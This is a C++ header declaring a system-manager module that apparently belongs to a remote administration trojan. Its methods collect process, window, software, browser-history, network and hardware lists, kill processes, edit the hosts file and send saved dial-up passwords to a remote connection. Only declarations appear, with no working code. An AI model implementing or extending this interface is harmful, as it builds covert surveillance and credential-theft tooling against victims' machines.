#pragma once


#include "Manager.h"

class CSystemManager : public CManager
{
public:

	CSystemManager(CClientSocket* pClient, UINT Ports, UCHAR Linetypes, UCHAR Opertypes, CHAR* Addressl);
	virtual ~CSystemManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	virtual void NetSystem(UINT Port);
	static bool DebugPrivilege(const char* PName, BOOL bEnable);
	static bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam);

private:
	UINT    NetPort;    //连接端口
	UCHAR   NetLine;    //连接方式
	UCHAR   NetOpert;   //运行类型
	CHAR* Linkaddress;  //连接地址

	LPBYTE getProcessList();
	LPBYTE getWindowsList();
	void SendProcessList();
	void SendWindowsList();
	void SendDialupassList();
	void SendHostsFileInfo();
	void SaveHostsFileInfo(LPBYTE lpBuffer, UINT nSize);
	void KillProcess(LPBYTE lpBuffer, UINT nSize);

	LPBYTE getSoftWareList();
	void SendSoftWareList();

	LPBYTE getIEHistoryList();
	void SendIEHistoryList();

	void SendFavoritesUrlList();
	LPBYTE getFavoritesUrlList();

	void SendNetconfigList();
	LPBYTE getNetconfigList();

	void SendHardwareList();
	LPBYTE getHardwareList();

	void SendStartupList();
	LPBYTE getStartupList();

	void SendNetStateList();

	char* DelSpace(char* szData);
	void getSendSystemInfo();

protected:
	//	HANDLE hStopEvent;
	HANDLE hSendMemoryThread;
	static DWORD WINAPI SendCPUAndMemoryThread(LPVOID lparam);
	void TestWindow(LPBYTE buf);
	void CloseWindow(LPBYTE buf);
};
